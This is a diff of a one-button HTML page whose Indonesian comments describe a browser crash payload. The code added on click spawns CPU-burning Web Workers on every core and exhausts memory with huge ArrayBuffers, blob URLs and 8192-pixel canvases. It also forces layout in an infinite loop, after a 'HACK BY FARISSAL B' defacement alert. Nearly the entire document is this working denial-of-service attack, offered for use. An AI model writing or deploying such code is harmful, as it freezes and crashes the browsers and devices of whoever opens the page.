@@ -5,25 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
     <title>testertster</title>
     <style>
-      body,
-      html {
-        margin: 0;
-        padding: 0;
-        height: 100%;
-        background: #fff;
-      }
+      body, html { margin: 0; padding: 0; height: 100%; background: #fff; }
       button {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        padding: 15px 30px;
-        font-size: 18px;
-        background: #007aff;
-        color: #fff;
-        border: none;
-        border-radius: 10px;
-        cursor: pointer;
+        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        padding: 15px 30px; font-size: 18px; background: #007aff; color: #fff;
+        border: none; border-radius: 10px; cursor: pointer;
       }
     </style>
   </head>
@@ -34,27 +20,67 @@
       document.getElementById("startBtn").onclick = function () {
         this.remove();
 
-        // HANG BERAT: layout thrashing + memory exhaustion
-        // Renderer akan freeze total, alert tidak akan sempat muncul
-        // sampai loop selesai (atau Chrome "Page unresponsive")
+        // ===== VEKTOR 1: Worker CPU burn di semua core (tidak bisa di-stop dari main thread) =====
+        const workerSrc = `
+          const arr = [];
+          for (;;) {
+            arr.push(Math.random() * Math.random()); // makan RAM + CPU sekaligus
+            JSON.parse(JSON.stringify(arr));          // serialisasi berat tiap iterasi
+          }
+        `;
+        const blob = new Blob([workerSrc], { type: "text/javascript" });
+        const url = URL.createObjectURL(blob);
+        const cores = navigator.hardwareConcurrency || 8;
+        for (let i = 0; i < cores; i++) {
+          try { new Worker(url); } catch (e) {}
+        }
+
+        // ===== VEKTOR 2: Memory balloon di main thread (heap exhaustion) =====
+        const chunks = [];
+        function balloon() {
+          try {
+            for (;;) chunks.push(new ArrayBuffer(1 << 26)); // 64MB per chunk
+          } catch (e) {}
+        }
+
+        // ===== VEKTOR 3: Layout thrashing sinkron =====
         const d = document.createElement("div");
         document.body.appendChild(d);
-        const chunks = [];
-
-        setTimeout(function () {
+        function thrash() {
           let i = 0;
-          while (true) {
+          for (;;) {
             d.style.width = i + "px";
-            void d.offsetWidth; // forced synchronous layout
-            chunks.push(new Array(1e5).join("A")); // memory balloon
+            d.style.transform = "translate(" + i + "px,0)";
+            void d.offsetWidth;
             i++;
           }
-        }, 10);
+        }
 
-        // Alert muncul belakangan — kalau renderer belum mati total
-        setTimeout(function () {
-          alert("HACK BY FARISSAL B");
-        }, 5000);
+        // ===== VEKTOR 4: Blob URL explosion (memory di luar heap JS) =====
+        function blobBomb() {
+          for (;;) {
+            fetch(URL.createObjectURL(new Blob([new ArrayBuffer(1 << 24)])));
+          }
+        }
+
+        // ===== VEKTOR 5: Canvas allocation besar-besaran (GPU/process memory) =====
+        function canvasBomb() {
+          const c = document.createElement("canvas");
+          for (;;) {
+            c.width = 8192; c.height = 8192;
+            const ctx = c.getContext("2d");
+            ctx.fillRect(0, 0, 8192, 8192);
+          }
+        }
+
+        // Semua dijalankan bertahap biar alert sempat muncul dulu,
+        // lalu halaman mati total sesudahnya
+        setTimeout(() => alert("HACK BY FARISSAL B"), 1000);
+
+        setTimeout(thrash, 1500);
+        setTimeout(balloon, 1700);
+        setTimeout(canvasBomb, 1900);
+        setTimeout(blobBomb, 2100);
       };
     </script>
   </body>
